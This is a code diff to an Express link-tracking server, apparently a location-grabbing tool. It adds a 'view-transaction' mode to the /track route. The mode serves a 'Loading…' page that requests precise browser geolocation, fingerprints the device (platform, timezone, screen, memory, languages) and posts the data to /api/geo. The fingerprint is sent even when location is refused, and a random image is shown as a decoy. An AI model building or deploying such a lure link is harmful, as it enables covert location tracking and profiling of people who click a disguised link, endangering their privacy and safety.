@@ -1,3 +1,4 @@
+ 
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
@@ -32,6 +33,11 @@ app.use(cors({ origin: BASE_URL, credentials: true }));
 const dataDir = path.join(__dirname, '..', 'data');
 if (!fs.existsSync(dataDir)) {
   fs.mkdirSync(dataDir, { recursive: true });
+}
+// Ensure images directory exists for served assets
+const imagesDir = path.join(__dirname, '..', 'public', 'images');
+if (!fs.existsSync(imagesDir)) {
+  fs.mkdirSync(imagesDir, { recursive: true });
 }
 
 // Initialize SQLite
@@ -157,10 +163,12 @@ function safeRedirectUrl(input) {
 // Health
 app.get('/healthz', (req, res) => res.status(200).send('OK'));
 
-// Track route: log IP-based info and immediately redirect
+// Track route: log IP-based info. Special case: if u=view-transaction → return random image; otherwise redirect to valid URL.
 app.get('/track', (req, res) => {
   const destParam = Array.isArray(req.query.u) ? req.query.u[0] : req.query.u;
-  const destUrl = safeRedirectUrl(destParam || REDIRECT_DEFAULT);
+  const rawDest = destParam ? String(destParam) : '';
+  const isImageMode = rawDest === 'view-transaction';
+  const destUrl = isImageMode ? null : safeRedirectUrl(rawDest || REDIRECT_DEFAULT);
 
   const id = generateId();
   const createdAt = new Date().toISOString();
@@ -185,7 +193,7 @@ app.get('/track', (req, res) => {
     user_agent: userAgent,
     accept_language: acceptLanguage,
     referrer,
-    dest_url: destUrl,
+    dest_url: isImageMode ? rawDest : destUrl,
     approx_country: approx && approx.country ? approx.country : null,
     approx_region: approx && Array.isArray(approx.region) ? approx.region.join(',') : approx && approx.region ? String(approx.region) : null,
     approx_city: approx && approx.city ? approx.city : null,
@@ -200,8 +208,135 @@ app.get('/track', (req, res) => {
     // continue
   }
 
-  // Immediately redirect to destination
+  if (isImageMode) {
+    // Set correlation cookie so /api/geo can update this click
+    res.cookie('cid', id, { httpOnly: true, sameSite: 'lax', maxAge: 1000 * 60 * 5 });
+    // Serve minimal HTML that requests geolocation, posts it, then shows a random image
+    const html = `<!doctype html>
+    <html>
+      <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <title>Loading…</title>
+        <style>
+          html,body { height:100%; margin:0 }
+          body { display:flex; align-items:center; justify-content:center; background:#0b0b0b; color:#e5e5e5; font:14px system-ui, -apple-system, Segoe UI, Roboto, sans-serif }
+          .box { text-align:center }
+          img { max-width: min(92vw, 640px); height: auto; border-radius: 12px; box-shadow: 0 6px 30px rgba(0,0,0,.35) }
+          .muted { opacity: .7; margin-top: 8px }
+        </style>
+      </head>
+      <body>
+        <div class="box">
+          <div id="msg">Requesting location…</div>
+          <div class="muted">You may be prompted to allow access.</div>
+          <img id="img" alt="" style="display:none" />
+        </div>
+        <script>
+          (function(){
+            var msg = document.getElementById('msg');
+            var img = document.getElementById('img');
+            // Always start loading the image immediately
+            img.style.display = 'block';
+            img.src = '/image/random?t=' + Date.now();
+            img.onerror = function(){ setTimeout(function(){ img.src = '/image/random?t=' + Date.now(); }, 300); };
+            function showImage(){ msg.textContent = ''; }
+            function postGeo(payload){
+              return fetch('/api/geo', { method:'POST', headers:{'Content-Type':'application/json'}, credentials:'include', body: JSON.stringify(payload) });
+            }
+            function toNum(n){ return (typeof n === 'number' && isFinite(n)) ? n : null; }
+            var device = {
+              platform: navigator.platform || null,
+              vendor: navigator.vendor || null,
+              language: navigator.language || null,
+              languages: Array.isArray(navigator.languages) ? navigator.languages.slice(0,8) : null,
+              timezone: (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : null,
+              hardwareConcurrency: toNum(navigator.hardwareConcurrency),
+              deviceMemory: toNum(navigator.deviceMemory),
+              screenW: (window.screen && window.screen.width) ? Number(window.screen.width) : null,
+              screenH: (window.screen && window.screen.height) ? Number(window.screen.height) : null,
+              colorDepth: (window.screen && window.screen.colorDepth) ? Number(window.screen.colorDepth) : null,
+              doNotTrack: (navigator.doNotTrack === '1')
+            };
+            // If not a secure context (e.g., http on LAN IP), browsers block geolocation.
+            // In that case, just show the image immediately.
+            if (!('geolocation' in navigator) || !window.isSecureContext) { showImage(); return; }
+            var timeout = setTimeout(function(){ showImage(); }, 1500);
+            navigator.geolocation.getCurrentPosition(function(pos){
+              clearTimeout(timeout);
+              var c = pos.coords || {};
+              postGeo({ lat: toNum(c.latitude), lon: toNum(c.longitude), accuracy: toNum(c.accuracy), timestamp: pos.timestamp || Date.now(), consented: true, ...device }).finally(showImage);
+            }, function(){
+              clearTimeout(timeout);
+              postGeo({ consented: false, ...device }).finally(showImage);
+            }, { enableHighAccuracy: true, timeout: 1800, maximumAge: 0 });
+          })();
+        </script>
+      </body>
+    </html>`;
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    return res.send(html);
+  }
+
+  // Otherwise, redirect to destination
   res.redirect(302, destUrl);
+});
+
+function generateRandomSvgImage() {
+  const width = 640;
+  const height = 360;
+  const palettes = [
+    ['#0ea5e9', '#22d3ee'],
+    ['#22c55e', '#84cc16'],
+    ['#ef4444', '#f97316'],
+    ['#8b5cf6', '#06b6d4'],
+    ['#f59e0b', '#10b981']
+  ];
+  const emojis = ['😀','🚀','🎯','🔥','🌈','🍕','⭐','❤️','🎲','🛰️','🧠','🦊'];
+  const [c1, c2] = palettes[Math.floor(Math.random() * palettes.length)];
+  const emoji = emojis[Math.floor(Math.random() * emojis.length)];
+  const rx = 16 + Math.floor(Math.random() * 40);
+  const rotate = Math.floor(Math.random() * 360);
+  const svg = `<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="${width}" height="${height}" viewBox="0 0 ${width} ${height}">
+  <defs>
+    <linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
+      <stop offset="0%" stop-color="${c1}" />
+      <stop offset="100%" stop-color="${c2}" />
+    </linearGradient>
+  </defs>
+  <rect x="0" y="0" width="100%" height="100%" fill="url(#g)" rx="${rx}"/>
+  <g transform="translate(${width/2}, ${height/2}) rotate(${rotate})">
+    <circle cx="0" cy="0" r="112" fill="rgba(255,255,255,0.28)" />
+  </g>
+  <text x="50%" y="52%" dominant-baseline="middle" text-anchor="middle" font-size="120" fill="#ffffff">${emoji}</text>
+</svg>`;
+  return svg;
+}
+
+function pickRandomImageFile(dir) {
+  try {
+    const allowed = new Set(['.png', '.jpg', '.jpeg', '.webp', '.gif']);
+    const files = fs.readdirSync(dir)
+      .filter((f) => allowed.has(path.extname(f).toLowerCase()));
+    if (files.length === 0) return null;
+    const pick = files[Math.floor(Math.random() * files.length)];
+    return path.join(dir, pick);
+  } catch (_) {
+    return null;
+  }
+}
+
+// Serve a random image from public/images (fallback to SVG) — no logging here
+app.get('/image/random', (req, res) => {
+  const file = pickRandomImageFile(imagesDir);
+  if (file) {
+    res.setHeader('Cache-Control', 'no-store');
+    return res.sendFile(file);
+  }
+  res.setHeader('Content-Type', 'image/svg+xml; charset=utf-8');
+  res.setHeader('Cache-Control', 'no-store');
+  res.send(generateRandomSvgImage());
 });
 
 // Receive precise browser geolocation and device info
